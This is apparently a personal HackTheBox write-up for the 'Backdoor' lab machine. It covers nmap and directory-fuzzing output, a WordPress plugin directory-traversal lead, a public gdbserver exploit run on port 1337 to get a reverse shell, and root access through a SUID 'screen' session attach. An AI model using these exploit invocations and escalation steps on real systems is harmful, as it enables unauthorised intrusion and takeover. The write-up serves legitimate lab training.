---
title: "Backdoor"
date: 2022-09-20T14:03:31+01:00
draft: false
categories:
  - HackTheBox
---

## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```bash
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 63830, Words: 3830, Lines: 330]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]

```

The website is powered by `wordpress`...always good to know

```html
<meta name="generator" content="WordPress 5.8.1" />
<link rel="canonical" href="http://backdoor.htb/" />
<link rel='shortlink' href='http://backdoor.htb/' />
```

When clicking on home button it points to `backdoor.htb` so I add it to `/etc/hosts`

which make me look for potential vhosts and subdomains but nah...

when visiting the pages found with the fuzzer we notice with have access to `wp-content`

try to access he `plugins` directory at `/wp-content/plugins/`

there is a single plugin installed :

`ebook-download`

```php
=== Plugin Name ===
Contributors: zedna
Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=3ZVGZTC7ZPCH2&lc=CZ&item_name=Zedna%20Brickick%20Website&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
Tags: ebook, file, download
Requires at least: 3.0.4
Tested up to: 4.4
Stable tag: 1.1
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Allow user to download your ebook custom file when insert an email.
```
we google that for exploits and end up [here!](https://www.exploit-db.com/exploits/39575)

that's simple dir traversal dawg....

ye no it was not "simple"...I was stuck here for days

went to the forums and SEEMS LIKE I MISSED A PORT???

ran nmap again...again...aggressive mode ad all but I could not get it

analyzed that specific port and it was filtered? resetting the machine didnt help

Did that later and wtf?

```bash
└──╼ $nmap backdoor.htb -p 1337
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 16:08 WAT
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.13s latency).

PORT     STATE SERVICE
1337/tcp open  waste
```
Anyway long story short we get an exploit for `gdb-server` on exploit-db

we run it and get access.

Hey don't ask me I am confused too XD

```bash
└──╼ $python 50539.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

```bash
cat user.txt
```

## privilege escalation

`sudo -l` would not work...how about `suid`?

```bash
user@Backdoor:/home/user$ find / -perm -u=s 2> /dev/null
find / -perm -u=s 2> /dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```
what is `screen`?

Gtfobins say...well...I know this one but not with SUID

```bash
user@Backdoor:/home/user$ screen -h
screen -h
Use: screen [-opts] [cmd [args]]
 or: screen -r [host.tty]

Options:
-4            Resolve hostnames only to IPv4 addresses.
-6            Resolve hostnames only to IPv6 addresses.
-a            Force all capabilities into each window's termcap.
-A -[r|R]     Adapt all windows to the new display width & height.
-c file       Read configuration file instead of '.screenrc'.
-d (-r)       Detach the elsewhere running screen (and reattach here).
-dmS name     Start as daemon: Screen session in detached mode.
-D (-r)       Detach and logout remote (and reattach here).
-D -RR        Do whatever is needed to get a screen session.
-e xy         Change command characters.
-f            Flow control on, -fn = off, -fa = auto.
-h lines      Set the size of the scrollback history buffer.
-i            Interrupt output sooner when flow control is on.
-l            Login mode on (update /var/run/utmp), -ln = off.
-ls [match]   or
-list         Do nothing, just list our SockDir [on possible matches].
-L            Turn on output logging.
-Logfile file Set logfile name.
-m            ignore $STY variable, do create a new screen session.
-O            Choose optimal output rather than exact vt100 emulation.
-p window     Preselect the named window if it exists.
-q            Quiet startup. Exits with non-zero return code if unsuccessful.
-Q            Commands will send the response to the stdout of the querying process.
-r [session]  Reattach to a detached screen process.
-R            Reattach if possible, otherwise start a new session.
-s shell      Shell to execute rather than $SHELL.
-S sockname   Name this session <pid>.sockname instead of <pid>.<tty>.<host>.
-t title      Set title. (window's name).
-T term       Use term as $TERM for windows, rather than "screen".
-U            Tell screen to use UTF-8 encoding.
-v            Print "Screen version 4.08.00 (GNU) 05-Feb-20".
-wipe [match] Do nothing, just clean up SockDir [on possible matches].
-x            Attach to a not detached screen. (Multi display mode).
-X            Execute <cmd> as a screen command in the specified session.
```

hmm...okay

```bash
export TERM=xterm
screen -x root/root
```

```bash
root@Backdoor:~# cat root.txt
cat root.txt
```

That was a fun box, but it left me with many questions

The forums said the LFI was supposed to serve for reading `proc` file about the `gbd-server`

the privilge escalation was not hard though
